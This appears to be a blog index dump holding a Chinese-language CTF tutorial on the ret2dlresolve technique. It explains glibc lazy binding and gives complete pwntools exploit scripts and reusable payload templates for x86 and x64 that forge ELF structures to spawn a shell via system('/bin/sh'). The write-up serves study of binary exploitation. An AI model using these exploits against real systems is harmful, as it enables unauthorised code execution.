[{"title":"前言","url":"/2025/04/29/%E5%89%8D%E8%A8%80/","content":"​\t重新折腾了一下blog，之前也折腾过一个，但是一段时间就没有管了。写blog主要是想记录自己的生活和学习总结。也是对自己的一个督促。希望有一天自己能够成为独当一面的存在\n"},{"title":"ret2dl","url":"/2025/05/12/ret2dl/","content":"延迟绑定运作流程\n\ndl_runtime_resolve运作流程理解_dl_runtime_resolve的流程需要了解几个段\n1、dynamic段.dynamic段中保存了动态链接器需要的信息，Dynamic Symbol Table（动态链接符号表）、Dynamic String Table（动态链接字符串表）、重定位表等的位置动调看一下具体情况\nELF32_Dyn的结构如下\ntypedef struct  &#123;    Elf32_Sword  d_tag;       /* Dynamic entry type */    union      &#123;        Elf32_Word d_val;          /* Integer value */        Elf32_Addr d_ptr;          /* Address value */      &#125; d_un;  &#125; Elf32_Dyn;\n\n整个结构体为8字节，\n2、Dynamic Symbol Table（动态链接符号表）通常被称为”.dynsym”,readelf -s file可查看，保存了与动态链接相关的符号，”.symtab”中保存了所有符号\n3、Dynamic String Table（动态链接字符串表）通常被称为”.dymstr”,再ida中可以找到，记录了符号的名称。因为.dynsym记录了固定长度的内容，不能描述二进制文件的任意字符串，所以需要该表来存储函数的名称。\n过程（结合动调来看一下）dl_runtime_resolve(link_map_obj, reloc_index)\n 它调用了dl_fixup函数 dl_fixup函数又调用了_dl_lookup_symbol_x函数\ndl_fixup部分源码如下\n_dl_fixup(struct link_map *l,ElfW(Word) reloc_arg)&#123;\t// 首先通过参数reloc_arg计算重定位的入口，这里的JMPREL即.rel.plt，reloc_offest即reloc_arg\tconst PLTREL *const reloc = (const void *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);\t// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目\tconst ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];\t// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JMUP_SLOT=7\tassert(ELF(R_TYPE)(reloc-&gt;info) == ELF_MACHINE_JMP_SLOT);\t// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址\tresult = _dl_lookup_symbol_x (strtab + sym -&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL);\t// value为libc基址加上要解析函数的偏移地址，也即实际地址\tvalue = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : 0);\t// 最后把value写入相应的GOT表条目中\treturn elf_machine_fixup_plt (l, result, reloc, rel_addr, value);\t&#125;\n\n首先通过link_map去找到.dynamic的地址，再分别取出.dynstm .dynstr .rel.plt\n\n其中两个入操作为_dl_runtime_resolve的参数，分别是reloc_index,和link_map的地址\nlink_map源码如下\nstruct link_map  &#123;    /* These first few members are part of the protocol with the debugger.       This is the same format used in SVR4.  */    ElfW(Addr) l_addr;    /* Base address shared object is loaded at.  */    char *l_name;     /* Absolute file name object was found in.  */    ElfW(Dyn) *l_ld;      /* Dynamic section of the shared object.  */    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */&#125;;\n\n第三个参数即为.dynamic的地址\nreadelf -d file查看一下.dynamic内容\n\n.dynstm .dynstr和.rel.plt的偏移分别为9，10，16.结合ELF32_Dyn为8字节，实际的值在后面4节，因此可以得到他们的偏移分别是9*8-4，10*8-4可以对应去取出相应的内容。\nrel.plt加上reloc_index就定位了ELF32_Rel指针，即0x804833c + 0\n\nELF32_Rel源码如下\ntypedef struct&#123;  Elf32_Addr   r_offset;     /* Address */  Elf32_Word   r_info;          /* Relocation type and symbol index */&#125; Elf32_Rel;\n\n根据ida中图得知，r_offset即 0x804a00c，是got.plt的地址，最后的解析地址也将会放入这里，r_inf0 &#x3D; 0x107\n而将r_info&gt;&gt;8作为dynsym的下标，即0x107&gt;&gt;8&#x3D;1  即右移8位\n\nElf32_Sym的源码如下\ntypedef struct  &#123;    Elf32_Word   st_name;      /* Symbol name (string tbl index) */    Elf32_Addr   st_value;     /* Symbol value */    Elf32_Word   st_size;      /* Symbol size */    unsigned char    st_info;      /* Symbol type and binding */    unsigned char    st_other;     /* Symbol visibility */    Elf32_Section    st_shndx;     /* Section index */  &#125; Elf32_Sym;\n\n第一个st_name就是.dynstr距离函数名的偏移。\n\n偏移即为20\n\n.dynstr首地址加上0x20就是read的函数名\n最后\n\n调用dl_lookup_symbol_x,在动态链接库中搜索。\n总结上述过程总结一下\n我们的目的是找到函数名称字符串的地址，交给dl_lookup_symbol_x去libc中寻找。\n流程便是获得.dynstr中函数名称字符串的流程\n首先通过link_map去找到.dynamic段的地址，因为可以以此得到.dynsym .dynstr .rel.plt的地址\n.rel.plt地址 加上 dl_runtime_resolve的第二个参数reloc_index可以得到read的Elf32_Rel\n接下来通过由ELF32_Rel第二个成员r_info&gt;&gt;8，即可得到.dynsym中的偏移得到read Elf32_Sym\nElf32_Sym中的第一个参数st_name存放着函数名称字符串距离.dynstr首地址的偏移，如此便得到了函数名称字符串\n漏洞点清楚了上面流程，发现最后dl_lookup_symbol_x函数回去搜索字符串，但是不会检查是否是此时延迟绑定的函数。同时没有检查重定位表的边界，dl_runtime_resolve的第二个参数reloc_index可以很大，超过.rel.plt范围。\n因此我们可以伪造第二个参数,使其偏移到我们的可控内存，再按照上面流程，伪造一系列结构，最后让距离\n利用x86ssize_t vuln()&#123;  _BYTE buf[40]; // [esp+0h] [ebp-28h] BYREF  return read(0, buf, 0x100u);&#125;\n\n只有一个read，没有打印函数\nfrom pwn import*  p = process(&#x27;./ret2dl&#x27;)elf = ELF(&#x27;./ret2dl&#x27;)#libc = ELF(&quot;./libc-2.27.so&quot;)  #p =remote(&#x27;node4.anna.nssctf.cn&#x27;,28537)context.terminal = [&#x27;wt.exe&#x27;, &#x27;wsl&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]context(log_level = &#x27;debug&#x27;,arch = elf.arch,os = elf.os)  def debug():    gdb.attach(p)    pause()  plt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addrrel_plt = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addrdynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addrdynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addr  offset = 0x28 + 4read_plt = elf.plt[&#x27;read&#x27;]pop_ebx_esi_edi_ebp_ret = 0x080485d8leave_ret = 0x0804852b#bss = 0x804a040base_addr = 0x0804a800  fake_sym_addr=base_addr+32align=0x10-((fake_sym_addr-dynsym)&amp;0xf) #16字节对齐fake_sym_addr+=alignst_name=fake_sym_addr+0x10-dynstrst_info=12fake_sym=p32(st_name)+p32(0)+p32(0)+p32(st_info) #伪造Elf32_Sym  r_offset = elf.got[&#x27;read&#x27;]r_sym=(fake_sym_addr-dynsym)/0x10r_type=0x7r_info=(int(r_sym)&lt;&lt;8)+(r_type&amp;0xf)reloc_index=base_addr-rel_plt+24fake_rel_plt=p32(r_offset)+p32(r_info)  #debug()payload=offset*b&#x27;a&#x27;payload+=p32(read_plt)payload+=p32(pop_ebx_esi_edi_ebp_ret)payload+=p32(0)payload+=p32(base_addr)payload+=p32(100)payload+=p32(base_addr-4)payload+=p32(leave_ret)p.sendline(payload)  debug()payload1=p32(plt0)payload1+=p32(reloc_index)payload1+= p32(0)payload1+=p32(base_addr+80)payload1+=p32(0)payload1+=p32(0)payload1+=fake_rel_pltpayload1+=align*b&#x27;a&#x27;payload1+=fake_sympayload1+=b&#x27;system\\x00&#x27;payload1+=(80-len(payload))*b&#x27;a&#x27;payload1+=b&#x27;/bin/sh\\x00&#x27;  p.send(payload1)p.interactive()\n\n\n\nx64x64如果按照x86一样伪造间接控制重定向的各表项，会出现问题。原因是在_dl_fixup函数执行过程中，访问到了一段未映射的地址\n查看dl_fixup的完整源码分析ret2_dl_runtime_resolve\n_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg) // 第一个参数link_map，也就是got[1]&#123;    // 获取link_map中存放DT_SYMTAB的地址  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);    // 获取link_map中存放DT_STRTAB的地址  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);\t// reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);    // 根据重定位结构体的r_info得到symtab表中对应的结构体  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];      void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  /* Sanity check that we&#x27;re really looking at a PLT relocation.  */  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT); // 检查r_info的最低位是不是7   /* Look up the target symbol.  If the normal lookup rules are not      used don&#x27;t look in the global scope.  */  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0) // 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码    &#123;      const struct r_found_version *version = NULL;\t// 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)\t&#123;      // 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff的过程中，由于我们一般伪造的symtab位于bss段，就导致在64位下reloc-&gt;r_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段，第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。\t  const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);\t  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;\t  version = &amp;l-&gt;l_versions[ndx];\t  if (version-&gt;hash == 0)\t    version = NULL;\t&#125;      /* We need to keep the scope around so do some locking.  This is\t not necessary for objects which cannot be unloaded or when\t we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)\t&#123;\t  THREAD_GSCOPE_SET_FLAG ();\t  flags |= DL_LOOKUP_GSCOPE_LOCK;\t&#125;      RTLD_ENABLE_FOREIGN_CALL;\t// 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,\t\t\t\t    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)\tTHREAD_GSCOPE_RESET_FLAG ();      RTLD_FINALIZE_FOREIGN_CALL;      /* Currently result contains the base load address (or link map)\t of the object that defines sym.  Now add in the symbol\t offset.  */      // 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : 0);    &#125;  else    &#123;       // 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l-&gt;l_addr + st_value,我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value      /* We already found the symbol.  The module (and therefore its load\t address) is also known.  */      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);      result = l;    &#125;  /* And now perhaps the relocation addend.  */  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__glibc_unlikely (GLRO(dl_bind_not)))    return value;  // 最后把value写入相应的GOT表条目中  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);&#125;\n\n因此64位下我们需要控制link_map中l-&gt;addr 和sym中st_value64位下sym的结构体\ntypedef struct  &#123;    Elf64_Word    st_name;        /* Symbol name (string tbl index) */    unsigned char st_info;        /* Symbol type and binding */    unsigned char st_other;       /* Symbol visibility */    Elf64_Section st_shndx;       /* Section index */    Elf64_Addr    st_value;       /* Symbol value */    Elf64_Xword   st_size;        /* Symbol size */  &#125; Elf64_Sym; \n\n其中\n\nElf64_Word 32 位\nElf64_Section 16 位\nElf64_Addr 64 位\nElf64_Xword 64 位\n\n所以如果将一个函数的got表地址-0x8作为sym的首地址，那么st_value就是got表地址，st_other也不为0\n64位link_map的源码\nstruct link_map &#123;    Elf64_Addr l_addr;    char *l_name;    Elf64_Dyn *l_ld;    struct link_map *l_next;    struct link_map *l_prev;    struct link_map *l_real;    Lmid_t l_ns;    struct libname_list *l_libname;    Elf64_Dyn *l_info[76];  //l_info 里面包含的就是动态链接的各个表的信息    ...    size_t l_tls_firstbyte_offset;    ptrdiff_t l_tls_offset;    size_t l_tls_modid;    size_t l_tls_dtor_count;    Elf64_Addr l_relro_addr;    size_t l_relro_size;    unsigned long long l_serial;    struct auditstate l_audit[];&#125;\n\n.dynamic对应l_info中的内容\n因此我们伪造link_map表时，首先伪造l_info中的3个指针DT_STRTAB指针，DT_SYMTAB指针，DT_JMPREL指针后面控制l_addr的值\n然后伪造指向的三个elf64_dyn即可，dynstr只需要指向一个可读的地方，因为并没有用到\n64位重定位表项与32位不同\ntypedef struct&#123;  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */&#125; Elf64_Rela;\n\n上面几个类型都为64位，因此结构体大小为24字节\n\n另外就是，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0\n接下来我们伪造link_map，know_func_ptr为已解析函数的got表地址，offset为system函数与这个函数在libc上的偏移\n 1 from pwn import * 2  3 s=process(&#x27;./test&#x27;) 4 elf=ELF(&#x27;./test&#x27;) 5 libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) 6  7 plt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr 8 l_addr=libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;] 9 st_value=elf.got[&#x27;read&#x27;]10 11 def get_fake_link_map(fake_link_map_addr,l_addr,st_value):12     #the address of each fake pointer13     fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)14     fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+0x8)15     fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+0x18)16     #fake structure17     fake_Elf64_Dyn_SYM =p64(0)+p64(st_value-0x8)18     fake_Elf64_Dyn_JMPREL = p64(0)+p64(fake_link_map_addr+0x28)19       # JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x2820     r_offset = fake_link_map_addr - l_addr21     fake_Elf64_rela =p64(r_offset)+p64(0x7)+p64(0)22     #fake_link_map23     fake_link_map =p64(l_addr&amp;(2**64-1))# 0x824     fake_link_map+=fake_Elf64_Dyn_SYM   # 0x18  25     fake_link_map+=fake_Elf64_Dyn_JMPREL# 0x2826     fake_link_map+=fake_Elf64_rela      # 0x4027     fake_link_map+=b&quot;\\x00&quot;*0x28         # 0x6828     fake_link_map+=fake_Elf64_Dyn_STR_addr     # STRTAB pointer,0x7029     fake_link_map+=fake_Elf64_Dyn_SYM_addr     # SYMTAB pointer,0x7830     fake_link_map+=b&quot;/bin/sh\\x00&quot;.ljust(0x80,b&#x27;\\x00&#x27;) # 0xf831     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  # JMPREL pointer    32     return fake_link_map33 34 35 pop_rdi_ret = 0x40122336 pop_rsi_r15_ret = 0x40122137 ret = 0x4011BE38 fake_link_map_addr = 0x40405039 40 41 fake_link_map=get_fake_link_map(fake_link_map_addr,l_addr,st_value)42 43 payload = b&#x27;\\x00&#x27;*0x28 + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(fake_link_map_addr) + p64(0) + p64(elf.plt[&#x27;read&#x27;])44 payload += p64(ret) + p64(pop_rdi_ret) + p64(fake_link_map_addr+0x78) + p64(plt0+6) + p64(fake_link_map_addr) + p64(0)45 payload = payload.ljust(0x200, b&#x27;\\x00&#x27;)46 47 s.sendafter(&quot;something:\\n&quot;,payload)48 49 s.send(fake_link_map)50 51 s.interactive()\n\n板子x86\nplt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addrrel_plt = elf.get_section_by_name(&#x27;.rel.plt&#x27;).header.sh_addrdynsym = elf.get_section_by_name(&#x27;.dynsym&#x27;).header.sh_addrdynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).header.sh_addrindex_offset=base_stage+20-rel_plt # .rel.pltfake_sym_addr=base_stage+28align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) // 0x10r_info = (index_dynsym &lt;&lt; 8)|0x7fake_rel_plt = p32(read_got) + p32(r_info)st_name = (fake_sym_addr + 16) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)fake_str= b&quot;system&quot;payload = b&#x27;AAAA&#x27;               # 4payload += p32(plt_0)           # 8payload += p32(index_offset)    # 12payload += b&#x27;aaaa&#x27;              # 16payload += p32(base_stage + 80) # 20 /bin/shpayload += fake_rel_plt         # 28payload += align * b&quot;B&quot;payload += fake_sympayload += fake_strpayload += b&quot;\\x00&quot; * (80 - len(payload))payload += b&#x27;/bin/sh\\x00&#x27;payload += b&quot;A&quot;*(200 - len(payload))\n\nx64\n 1 from pwn import * 2 context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) 3  4 s=process(&#x27;./test&#x27;) 5 elf=ELF(&#x27;./test&#x27;) 6 libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) 7  8 plt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr 9 l_addr=libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]10 st_value=elf.got[&#x27;read&#x27;]11 12 def get_fake_link_map(fake_link_map_addr,l_addr,st_value):13     #the address of each fake pointer14     fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)15     fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+0x8)16     fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+0x18)17     #fake structure18     fake_Elf64_Dyn_SYM =p64(0)+p64(st_value-0x8)19     fake_Elf64_Dyn_JMPREL = p64(0)+p64(fake_link_map_addr+0x28)20       # JMPREL point to the address of .rel.plt，which will be located in fake_link_map_addr+0x2821     r_offset = fake_link_map_addr - l_addr22     fake_Elf64_rela =p64(r_offset)+p64(0x7)+p64(0)23     #fake_link_map24     fake_link_map =p64(l_addr&amp;(2**64-1))# 0x825     fake_link_map+=fake_Elf64_Dyn_SYM   # 0x18  26     fake_link_map+=fake_Elf64_Dyn_JMPREL# 0x2827     fake_link_map+=fake_Elf64_rela      # 0x4028     fake_link_map+=b&quot;\\x00&quot;*0x28         # 0x6829     fake_link_map+=fake_Elf64_Dyn_STR_addr     # STRTAB pointer,0x7030     fake_link_map+=fake_Elf64_Dyn_SYM_addr     # SYMTAB pointer,0x7831     fake_link_map+=b&quot;/bin/sh\\x00&quot;.ljust(0x80,b&#x27;\\x00&#x27;) # 0xf832     fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  # JMPREL pointer    33     return fake_link_map34 35 &#x27;&#x27;&#x27;36 typedef struct            37 &#123;38 Elf64_Word    st_name;        /* Symbol name (string tbl index) */39 unsigned char    st_info;   /* Symbol type and binding */        40 unsigned char st_other;     /* Symbol visibility */              41 Elf64_Section    st_shndx;  /* Section index */                  42 Elf64_Addr    st_value;     /* Symbol value */                   43 Elf64_Xword    st_size;     /* Symbol size */                    44 &#125;Elf64_Sym;45 46 typedef struct           47 &#123;48 Elf64_Addr    r_offset;         /* Address */                         49 Elf64_Xword    r_info;          /* Relocation type and symbol index */50 Elf64_Sxword    r_addend;       /* Addend */                          51 &#125;Elf64_Rela;52 53 typedef struct          54 &#123;55 Elf64_Sxword    d_tag;          /* Dynamic entry type */56 union57 &#123;58 Elf64_Xword d_val;          /* Integer value */59 Elf64_Addr d_ptr;           /* Address value */60 &#125; d_un;61 &#125;Elf64_Dyn;62 &#x27;&#x27;&#x27;\n\n参考链接ret2dl_resolve - 狒猩橙 - 博客园ret2dlresolve超详细教程(x86&amp;x64)-CSDN博客关于ret2_dl_runtime_resolve的学习总结 | ZIKH26’s Blog\n"}]